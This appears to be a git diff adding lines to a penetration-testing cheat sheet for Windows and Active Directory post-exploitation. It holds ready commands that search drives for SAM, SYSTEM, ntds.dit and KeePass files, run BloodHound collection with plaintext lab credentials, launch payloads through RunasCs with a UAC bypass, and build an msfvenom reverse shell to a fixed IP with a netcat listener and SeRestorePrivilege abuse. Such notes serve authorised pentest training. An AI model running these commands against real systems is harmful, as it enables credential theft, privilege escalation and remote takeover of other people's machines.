@@ -53,6 +53,7 @@ There are several key pieces of information we should always obtain:
 # Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*kdbx,*.git,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*kdbx,*.git,*.rdp,*.config,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like ":\Windows\Microsoft.NET\Framework\*") }
 > Get-ChildItem -Path C:\ -Include SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
 > Get-ChildItem -Path C:\ -Filter ".git" -Recurse -Force -ErrorAction SilentlyContinue # to discover .git or any folder in c:\
@@ -134,6 +135,7 @@ powershell -ep bypass
 # Convert SIDs to domain object name
 > Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
 # Clean output, look for all users with General All Rights for either a user or group object, can change permissions and change their passwords if user
+# DO THIS RECURSIVELYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
 > Get-ObjectAcl -Identity "Backup Operators" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights # Can also do this for GenericWrite,WriteOwner,WriteDACL,AllExtendedRights,ForceChangePassword,Self (Self-Membership)
 # Easier way to do the above
 > Find-InterestingDomainAcl # If you are GenericAll or Write privs, then you should simply add yourself to the group and inherit the rights associated 'net group "group_name" jimothy /add /domain', then rinse and repeat. Elevate your privileges as much as possible
@@ -153,9 +155,11 @@ Note that SharpHound supports looping, running cyclical queries over time like a
 > . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
 > Get-Help Invoke-BloodHound
 > Invoke-BloodHound -CollectionMethod All $ip -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "dev04-leon" # May take a couple minutes
+> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "user-"
 
 # Or remotely
 > bloodhound-python --dns-tcp -d support.htb -u ldap -p "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" -c all -ns $ip 
+> python bloodhound.py --dns-tcp -d $dom -u enox -p california -c all -ns $ip
 ```
 
 ```bash
@@ -189,7 +193,9 @@ Use PsLoggedon.exe if it's an older machine, such as Server 2012 R2, 2016 (1607)
 If you have credentials for another user on a system, but cannot seem to login as them through any of the traditional methods, use the:
 
 ```bash
-Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "<reverse shell code>""
+. .\Invoke-RunasCs.ps1
+Invoke-RunasCs svc_mssql trustno1 "cmd /c c:\windows\tasks\svc_mssql.exe" --bypass-uac
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "<reverse shell code>"
 ```
 
 and execute a reverse shell to get onto the system as them.
@@ -1642,6 +1648,15 @@ reg save hklm\system c:\Temp\system
 cd Temp
 download sam
 download system
+```
+
+#### SeRestorePrivilege
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.238 LPORT=443 EXITFUNC=thread -f exe > binary.exe
+upload binary.exe
+sudo nc -lvnp 80
+.\SeRestoreAbuse.exe "cmd /c C:\windows\tasks\binary.exe"
 ```
 
 #### Exploiting Service Operators Group Membership
